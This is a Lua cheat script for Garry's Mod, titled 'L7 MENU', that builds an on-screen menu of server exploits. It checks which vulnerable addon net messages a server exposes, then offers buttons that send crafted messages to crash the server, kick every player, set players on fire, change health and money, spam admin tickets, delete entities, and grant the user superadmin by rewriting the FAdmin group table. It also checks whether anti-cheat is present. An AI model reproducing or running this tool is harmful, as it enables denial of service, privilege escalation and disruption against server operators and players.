--/////////////////////////////////////////////////////////////////////////////////////////
--///																					///
--///									L7 MENU											///
--///								  ~stupid shit~										///
--///								   ~eta 1999~	     								///
--///																					///
--/////////////////////////////////////////////////////////////////////////////////////////
-----------------------------------------PRELOAD-------------------------------------------
currentver = "2.0"

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

function clearcon()
	for i=0, 100 do
	print(" ")
end end

local hide = {
	["CHudHealth"] = true,
	["CHudBattery"] = true
}

hook.Add( "HUDShouldDraw", "HideHUD", function( name )
	if ( hide[ name ] ) then return false end
	-- null
end )

function removehudshit() ---------------------- add all shit that needs to get removed when closing menu etc ( hud, drawings, images u fucking mong )
		hook.Remove("HUDPaint","TIME") 
		hook.Remove("HUDPaint","WELCOME")
		hook.Remove("HUDPaint","PLYNAME")
		hook.Remove("HUDPaint","STEAMID")
		hook.Remove("HUDPaint","STEAMIDHUD")
		hook.Remove("HUDPaint","VERSION")
		hook.Remove("HUDPaint","L7 MENU")
		hook.Remove("HUDPaint","AC1")
		hook.Remove("HUDPaint","AC2")
		hook.Remove("HUDPaint","AC3")
		hook.Remove("HUDPaint","CAC1")
		hook.Remove("HUDPaint","CAC2")
		hook.Remove("HUDPaint","CAC3")
		hook.Remove("HUDPaint","LINE1")
		hook.Remove("HUDPaint","LINE2")
		hook.Remove("HUDPaint","LINE3")
		hook.Remove("HUDPaint","LINE4")
		hook.Remove("HUDPaint","LINE5")
		hook.Remove("HUDPaint","LINE6")
		hook.Remove("HUDShouldDraw", "HideHUD")
		hook.Remove("HUDPaint","loadingTIME")
		hook.Remove("HUDPaintBackground","BACKGROUND")
		timer.Destroy("keepvisible")
		timer.Destroy("timerefresh")
		
end

local CACCHECK02 = ConVarExists("ulx cac")
local CACCHECK03 = ConVarExists("cac_menu")
--------------------------------------------------------------------------------EXPLOITS-LOAD
local E1 = ValidNetString("CFCreateGame") 
local E2 = ValidNetString("start_wd_emp") 
local E3 = ValidNetString("duelrequestguiYes") 
local E4 = ValidNetString("drugseffect_remove") 
local E5 = ValidNetString("drugs_money")
local E6 = ValidNetString("drugs_ignite")
local E7 = ValidNetString("drugseffect_hpremove")
local E8 = ValidNetString("drugs_text")
local E9 = ValidNetString("DarkRP_Kun_ForceSpawn")
local E10 = ValidNetString("SimplicityAC_aysent")
local E11 = ValidNetString("CreateCase")
local E12 = ValidNetString("pac_to_contraption")
local E13 = ValidNetString("NLRKick")
local E14 = ValidNetString("JoinOrg")
local E15 = ValidNetString("timebombDefuse")
local E16 = ValidNetString("pplay_deleterow")
local E17 = ValidNetString("75_plus_win")
local E18 = ValidNetString("ArmDupe")
local EE1 = ValidNetString("banleaver")
local EE2 = ValidNetString("giveweapon")
local EE3 = ValidNetString("ATMDepositMoney")
local EE4 = ValidNetString("SendMoney")
local EE6 = ValidNetString("BailOut")
local EE7 = ValidNetString("NLR.ActionPlayer")
local EE8 = ValidNetString("GivePlayerAFKWarning")
local EE9 = ValidNetString("DarkRP_Advert")

surface.CreateFont( "FONT01", { font = "Anime Ace 2.0 BB", size = 20, weight = 100, } )
surface.CreateFont( "FONT02", { font = "Hack", size = 100, weight = 100, } )
surface.CreateFont( "FONT03", { font = "Hack", size = 20, weight = 100, } )
surface.CreateFont( "FONT04", { font = "Hack", size = 15, weight = 100, } )

if CAC then CAC01 = "YES" else CAC01 = "NO" end
if CACCHECK02 then CAC02 = "YES" else CAC02 = "NO" end
if CACCHECK03 then CAC03 = "YES" else CAC03 = "NO" end

if gui.IsGameUIVisible() then
gui.HideGameUI()
end


local Frame1 = vgui.Create( "DFrame" )
Frame1:ShowCloseButton( false )
Frame1:SetDraggable( false )
Frame1:SetTitle( " " )
Frame1:SetPos( 0, 0 )
Frame1:SetSize( 960, 1080 )
Frame1:MakePopup()
Frame1.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) end


--///////////////////////////////////////////////////////////////
hook.Add( "HUDPaint", "L7 MENU", function()
	surface.SetFont( "FONT02" )
	surface.SetTextColor( 0, 255, 0, 255 )
	surface.SetTextPos( 10, 0 )
	surface.DrawText( "L7 HUD MENU" )
end )



hook.Add( "HUDPaint", "VERSION", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 587, 65 )
		surface.DrawText( currentver )
end)



hook.Add( "HUDPaintBackground", "BACKGROUND", function()
	surface.SetDrawColor( 0, 0, 0, 255 )
	surface.DrawRect( 0, 0, 635, 1080 )
end )



hook.Add( "HUDPaint", "LINE1", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 10, 100, 625, 5 )
end )



hook.Add( "HUDPaint", "LINE2", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 540, 100, 5, 80 )
end )



hook.Add( "HUDPaint", "LINE3", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 540, 125, 94, 5 )
end )



hook.Add( "HUDPaint", "LINE4", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 10, 180, 625, 5 )
end )



hook.Add( "HUDPaint", "LINE5", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 633, 0, 5, 1080 )
end )



hook.Add( "HUDPaint", "LINE6", function()
	surface.SetDrawColor( 0, 255, 0, 255 )
	surface.DrawRect( 5, 0, 5, 1080 )
end )



hook.Add( "HUDPaint", "WELCOME", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 13, 109 )
		surface.DrawText( "Welcome: " )
end)

hook.Add( "HUDPaint", "STEAMIDHUD", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 13, 132 )
		surface.DrawText( "Steam ID:" )
end)



hook.Add( "HUDPaint", "PLYNAME", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 95, 110 )
		surface.DrawText( LocalPlayer():GetName() )
end)




hook.Add( "HUDPaint", "STEAMID", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 105, 132 )
		surface.DrawText( LocalPlayer():SteamID() )
end)



timer.Create("timerefresh",0.1,0,function()
hook.Add( "HUDPaint", "TIME", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 550, 105 )
		surface.DrawText( os.date("%H:%M:%S") )
	end)
end)



hook.Add( "HUDPaint", "AC1", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 550, 130 )
		surface.DrawText( "AC1 /" )
end)



hook.Add( "HUDPaint", "AC2", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 550, 145 )
		surface.DrawText( "AC2 /" )
end)



hook.Add( "HUDPaint", "AC3", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor( 0, 255, 0, 255 )
		surface.SetTextPos( 550, 160 )
		surface.DrawText( "AC3 /" )
end)
 


hook.Add( "HUDPaint", "CAC1", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor(255,0,0)
		surface.SetTextPos( 610, 130 )
		surface.DrawText( CAC01 )
end)



hook.Add( "HUDPaint", "CAC2", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor(255,0,0)
		surface.SetTextPos( 610, 145 )
		surface.DrawText( CAC02 )
end)



hook.Add( "HUDPaint", "CAC3", function()
		surface.SetFont( "FONT03" )
		surface.SetTextColor(255,0,0)
		surface.SetTextPos( 610, 160 )
		surface.DrawText( CAC03 )
end)




--/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



local KEYPAD = vgui.Create( "DButton", Frame1 ) 
KEYPAD:SetText( "[KEYPAD]" )
KEYPAD:SetFont( "FONT03" ) 
KEYPAD:SetPos( 6, 185 )
KEYPAD:SetSize( 150, 35 )
KEYPAD:MakePopup()
KEYPAD.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
KEYPAD.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		net.Start('start_wd_emp') 
		net.SendToServer()
end



local MONEY1 = vgui.Create( "DButton", Frame1 ) 
MONEY1:SetText( "[MONEY]" )
MONEY1:SetFont( "FONT03" )
MONEY1:SetPos( 6, 205 )
MONEY1:SetSize( 150, 35 )
MONEY1:MakePopup()
MONEY1.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
MONEY1.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		net.Start("duelrequestguiYes")
		net.WriteInt(-9999999999999999999999999999,32)
		net.WriteEntity(table.Random( player.GetAll() ) )
		net.WriteString("Crossbow")
		net.SendToServer()
end



local DELWEP = vgui.Create( "DButton", Frame1 ) 
DELWEP:SetText( "[REMOVE WEAPONS]" )
DELWEP:SetFont( "FONT03" )
DELWEP:SetPos( 6, 225 )
DELWEP:SetSize( 150, 35 )
DELWEP:MakePopup()
DELWEP.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
DELWEP.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		net.Start("drugseffect_remove")
		net.SendToServer()
end



local DELMONEY = vgui.Create( "DButton", Frame1 )  
DELMONEY:SetText( "[DEL MONEY]" )
DELMONEY:SetFont( "FONT03" )
DELMONEY:SetPos( 6, 245 )
DELMONEY:SetSize( 150, 35 )
DELMONEY:MakePopup()
DELMONEY.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
DELMONEY.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		net.Start("drugs_money")
		net.SendToServer()
end



local IGNITEPROPS = vgui.Create( "DButton", Frame1 ) 
IGNITEPROPS:SetText( "[IGNITE PROPS]" )
IGNITEPROPS:SetFont( "FONT03" )
IGNITEPROPS:SetPos( 6, 265 )
IGNITEPROPS:SetSize( 150, 35 )
IGNITEPROPS:MakePopup()
IGNITEPROPS.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
IGNITEPROPS.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
        net.Start("drugs_ignite")
        net.WriteString("prop_physics")
        net.SendToServer()
end



local IGNITEPLYS = vgui.Create( "DButton", Frame1 ) 
IGNITEPLYS:SetText( "[IGNITE PLYS]" )
IGNITEPLYS:SetFont( "FONT03" )
IGNITEPLYS:SetPos( 6, 285 )
IGNITEPLYS:SetSize( 150, 35 )
IGNITEPLYS:MakePopup()
IGNITEPLYS.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
IGNITEPLYS.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
        net.Start("drugs_ignite")
        net.WriteString("player")
        net.SendToServer()
end



local HP2ONE = vgui.Create( "DButton", Frame1 ) 
HP2ONE:SetText( "[PLYS HP 1]" )
HP2ONE:SetFont( "FONT03" )
HP2ONE:SetPos( 6, 305 )
HP2ONE:SetSize( 150, 35 )
HP2ONE:MakePopup()
HP2ONE.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
HP2ONE.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
        net.Start("drugseffect_hpremove")
        net.WriteString(1)
        net.SendToServer()
end



local GODALL = vgui.Create( "DButton", Frame1 ) 
GODALL:SetText( "[GOD ALL]" )
GODALL:SetFont( "FONT03" ) 
GODALL:SetPos( 6, 325 )
GODALL:SetSize( 150, 35 )
GODALL:MakePopup()
GODALL.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
GODALL.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
        net.Start("drugseffect_hpremove")
        net.WriteString(299999)
        net.SendToServer()
end



local PROPDEL1 = vgui.Create( "DButton", Frame1 ) 
PROPDEL1:SetText( "[PROPS DEL #1]" )
PROPDEL1:SetFont( "FONT03" )
PROPDEL1:SetPos( 6, 345 )
PROPDEL1:SetSize( 150, 35 )
PROPDEL1:MakePopup()
PROPDEL1.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
PROPDEL1.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
        net.Start("drugs_text")
        net.WriteString("prop_physics")
        net.SendToServer()
end



local TPALL = vgui.Create( "DButton", Frame1 ) 
TPALL:SetText( "[TP ALL]" )
TPALL:SetFont( "FONT03" )
TPALL:SetPos( 6, 365 )
TPALL:SetSize( 150, 35 )
TPALL:MakePopup()
TPALL.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
TPALL.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
            net.Start("DarkRP_Kun_ForceSpawn")
            net.SendToServer()
end



local CRASH1 = vgui.Create( "DButton", Frame1 ) 
CRASH1:SetText( "[CRASH #1]" )
CRASH1:SetFont( "FONT03" )
CRASH1:SetPos( 6, 385 )
CRASH1:SetSize( 150, 35 )
CRASH1:MakePopup()
CRASH1.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
CRASH1.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
            local tbl = {}
            for i=1,400 do
                tbl[i] = i
            end
            net.Start("SimplicityAC_aysent")
            net.WriteUInt(1, 8)
            net.WriteUInt(4294967295, 32)
            net.WriteTable(tbl)
            net.SendToServer()
end



local SPAMADMIN = vgui.Create( "DButton", Frame1 ) 
SPAMADMIN:SetText( "[SPAM CASE]" )
SPAMADMIN:SetFont( "FONT03" )
SPAMADMIN:SetPos( 6, 405 )
SPAMADMIN:SetSize( 150, 35 )
SPAMADMIN:MakePopup()
SPAMADMIN.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end
SPAMADMIN.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		timer.Create("spam2", 0.02, 0, function()
			for i = 1, 300 do
				net.Start( "CreateCase" )
                net.WriteString( "netMenuL7.lua was here" )
                net.SendToServer()
		end
	end)
end



local CRASH2 = vgui.Create( "DButton", Frame1 ) 
CRASH2:SetText( "[CRASH #2]" )
CRASH2:SetFont( "FONT03" )
CRASH2:SetPos( 6, 425 )
CRASH2:SetSize( 150, 35 )
CRASH2:MakePopup()
CRASH2.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
CRASH2.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		local tbl = {}
			for i=1,1000000000 do
				tbl[#tbl + 1] = i
end
	net.Start("pac_to_contraption")
	net.WriteTable( tbl )
	net.SendToServer()
end



local KICKALL = vgui.Create( "DButton", Frame1 ) 
KICKALL:SetText( "[KICK ALL]" )
KICKALL:SetFont( "FONT03" )
KICKALL:SetPos( 6, 445 )
KICKALL:SetSize( 150, 35 )
KICKALL:MakePopup()
KICKALL.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
KICKALL.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		for k,v in pairs(player.GetAll()) do
			if v != LocalPlayer() then
				net.Start("NLRKick")
				net.WriteEntity(v)
				net.SendToServer()
		end
	end
end



local PROPDEL2 = vgui.Create( "DButton", Frame1 )
PROPDEL2:SetText( "[PROP DEL #2]" )
PROPDEL2:SetFont( "FONT03" )
PROPDEL2:SetPos( 6, 465 )
PROPDEL2:SetSize( 150, 35 )
PROPDEL2:SetIsToggle(true)
PROPDEL2:MakePopup()
PROPDEL2.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
PROPDEL2.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		for k,v in pairs(ents.GetAll()) do
            net.Start("timebombDefuse")
            net.WriteEntity(v)
            net.WriteBool(true)
            net.SendToServer()
	end
end



local SUPERADMIN = vgui.Create( "DButton", Frame1 )
SUPERADMIN:SetText( "[SA GET]" )
SUPERADMIN:SetFont( "FONT03" ) 
SUPERADMIN:SetPos( 6, 485 )
SUPERADMIN:SetSize( 150, 35 )
SUPERADMIN:MakePopup()
SUPERADMIN:SetIsToggle(true)
SUPERADMIN.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
SUPERADMIN.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		local id = LocalPlayer():SteamID()
		local tbl = {}
			tbl.name = "FAdmin_PlayerGroup"
			tbl.where = {
			"steamid",
			tostring(id)
			}
		net.Start("pplay_deleterow")
		net.WriteTable(tbl)
		net.SendToServer()
			local tbl = {}
			tbl.tblname = "FAdmin_PlayerGroup"
			tbl.tblinfo = {
			tostring(id),
			"superadmin"
			}
        net.Start("pplay_addrow")
        net.WriteTable(tbl)
        net.SendToServer()
end



local CRASH3 = vgui.Create( "DButton", Frame1 )
CRASH3:SetText( "[ADV CRASH]" )
CRASH3:SetFont( "FONT03" )
CRASH3:SetPos( 6, 505 )
CRASH3:SetSize( 150, 35 )
CRASH3:MakePopup()
CRASH3:SetIsToggle(true)
CRASH3.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
CRASH3.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		local f = file.Open('FinalOutput.txt', 'rb', 'DATA'); 
		local payload = f:Read(f:Size())
		local length = payload:len()
			net.Start('ArmDupe')
			net.WriteUInt(length, 32)
			net.WriteData(payload, length)
			net.SendToServer()
end





if (E2) then KEYPAD:SetTextColor(Color( 0, 255, 0 ) ) else KEYPAD:SetTextColor(Color( 255, 0, 55 ) ) end
if (E3) then MONEY1:SetTextColor(Color( 0, 255, 0 ) ) else MONEY1:SetTextColor(Color( 255, 0, 55 ) ) end
if (E4) then DELWEP:SetTextColor(Color( 0, 255, 0 ) ) else DELWEP:SetTextColor(Color( 255, 0, 55 ) ) end
if (E5) then DELMONEY:SetTextColor(Color( 0, 255, 0 ) ) else DELMONEY:SetTextColor(Color( 255, 0, 55 ) ) end
if (E6) then IGNITEPROPS:SetTextColor(Color( 0, 255, 0 ) ) else IGNITEPROPS:SetTextColor(Color( 255, 0, 55 ) ) end
if (E6) then IGNITEPLYS:SetTextColor(Color( 0, 255, 0 ) ) else IGNITEPLYS:SetTextColor(Color( 255, 0, 55 ) ) end
if (E7) then HP2ONE:SetTextColor(Color( 0, 255, 0 ) ) else HP2ONE:SetTextColor(Color( 255, 0, 55 ) ) end
if (E7) then GODALL:SetTextColor(Color( 0, 255, 0 ) ) else GODALL:SetTextColor(Color( 255, 0, 55 ) ) end
if (E8) then PROPDEL1:SetTextColor(Color( 0, 255, 0 ) ) else PROPDEL1:SetTextColor(Color( 255, 0, 55 ) ) end
if (E9) then TPALL:SetTextColor(Color( 0, 255, 0 ) ) else TPALL:SetTextColor(Color( 255, 0, 55 ) ) end
if (E10) then CRASH1:SetTextColor(Color( 0, 255, 0 ) ) else CRASH1:SetTextColor(Color( 255, 0, 55 ) ) end
if (E11) then SPAMADMIN:SetTextColor(Color( 0, 255, 0 ) ) else SPAMADMIN:SetTextColor(Color( 255, 0, 55 ) ) end
if (E12) then CRASH2:SetTextColor(Color( 0, 255, 0 ) ) else CRASH2:SetTextColor(Color( 255, 0, 55 ) ) end
if (E13) then KICKALL:SetTextColor(Color( 0, 255, 0 ) ) else KICKALL:SetTextColor(Color( 255, 0, 55 ) ) end
if (E14) then PROPDEL2:SetTextColor(Color( 0, 255, 0 ) ) else PROPDEL2:SetTextColor(Color( 255, 0, 55 ) ) end
if (E15) then SUPERADMIN:SetTextColor(Color( 0, 255, 0 ) ) else SUPERADMIN:SetTextColor(Color( 255, 0, 55 ) ) end
if (E16) then CRASH3:SetTextColor(Color( 0, 255, 0 ) ) else CRASH3:SetTextColor(Color( 255, 0, 55 ) ) end


KEYPAD:SizeToContents()
MONEY1:SizeToContents()
DELWEP:SizeToContents()
DELMONEY:SizeToContents()
IGNITEPROPS:SizeToContents()
IGNITEPLYS:SizeToContents()
HP2ONE:SizeToContents()
GODALL:SizeToContents()
PROPDEL1:SizeToContents()
TPALL:SizeToContents()
CRASH1:SizeToContents()
SPAMADMIN:SizeToContents()
CRASH2:SizeToContents()
KICKALL:SizeToContents()
PROPDEL2:SizeToContents()
SUPERADMIN:SizeToContents()
CRASH3:SizeToContents()

KEYPAD:SetVisible(true)
MONEY1:SetVisible(true)
DELWEP:SetVisible(true)
DELMONEY:SetVisible(true)
IGNITEPROPS:SetVisible(true)
IGNITEPLYS:SetVisible(true)
HP2ONE:SetVisible(true)
GODALL:SetVisible(true)
PROPDEL1:SetVisible(true)
TPALL:SetVisible(true)
CRASH1:SetVisible(true)
SPAMADMIN:SetVisible(true)
CRASH2:SetVisible(true)
KICKALL:SetVisible(true)
PROPDEL2:SetVisible(true)
SUPERADMIN:SetVisible(true)
CRASH3:SetVisible(true)



if (E18) then CRASH1:SetTextColor(Color( 0, 255, 0 ) ) else CRASH1:SetTextColor(Color( 255, 0, 55 ) ) end
--/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

local CLOSE = vgui.Create( "DButton", Frame1 ) 
CLOSE:SetText( "[CLOSE]" )
CLOSE:SetFont( "FONT03" )
CLOSE:SetTextColor(Color( 0, 255, 0 ) ) 
CLOSE:SetPos( 275, 1055 )
CLOSE:SizeToContents()
CLOSE:MakePopup()
CLOSE.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) 
end

CLOSE.DoClick = function() 

	surface.PlaySound("buttons/button17.wav")

		timer.Destroy("timerefresh")
		removehudshit()
		Frame1:Close()

end


timer.Create("keepvisible",0.3,0, function()
CLOSE:MakePopup()
end)

local SPAMEND = vgui.Create( "DButton", Frame1 )
SPAMEND:SetText( "[STOP SPAM]" )
SPAMEND:SetFont( "FONT03" )
SPAMEND:SetPos( -11, 520 )
SPAMEND:SetTextColor(Color( 0, 255, 0 ) )
SPAMEND:MakePopup()
SPAMEND:SizeToContents()
SPAMEND:SetSize( 150, 35 )
SPAMEND.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )	
end
SPAMEND.DoClick = function() 
	surface.PlaySound("buttons/button17.wav")
		timer.Destroy("spam1")
		timer.Destroy("spam2")
		timer.Destroy("spam3")
		timer.Destroy("keepvisible")
		removehudshit()
		Frame1:Close()
		clearcon()
end
